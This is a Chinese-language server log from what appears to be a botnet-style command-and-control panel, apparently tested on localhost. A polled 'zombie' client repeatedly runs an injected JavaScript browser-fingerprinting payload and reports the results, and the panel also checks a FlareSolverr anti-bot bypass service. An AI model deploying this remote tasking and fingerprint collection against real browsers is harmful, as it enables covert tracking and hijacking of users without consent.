2025-06-26 22:57:22 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:22.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:22] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:27 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:27 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:27.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0049s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:27] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:32 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:32 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:32.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:32] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:37 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:37 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:37.132Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0044s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:37] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:41 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:57:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:41] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:57:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:42 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:42 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:42.131Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0045s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:42] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:47 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:47 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:47.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0037s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:47] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:52 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:52 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:52.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0041s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:52] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:57 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:57 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:57.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0048s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:57] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:58:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:58:02 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:58:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:58:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:58:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:58:02 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:58:02.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:58:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:58:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:02] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:58:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:58:07 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:58:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:58:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:58:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:58:07 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:58:07.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:58:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0035s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:58:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:07] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:58:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:58:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:58:12 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:58:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:58:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:58:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:58:12 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:58:12.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:58:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:58:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:12] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:58:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:58:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:58:17 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:58:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0027s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:58:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:58:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:58:17 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:58:17.133Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:58:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:58:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:17] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:58:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:58:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:58:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:59:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:05.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:31 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:31.856Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0066s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:31] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:37 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
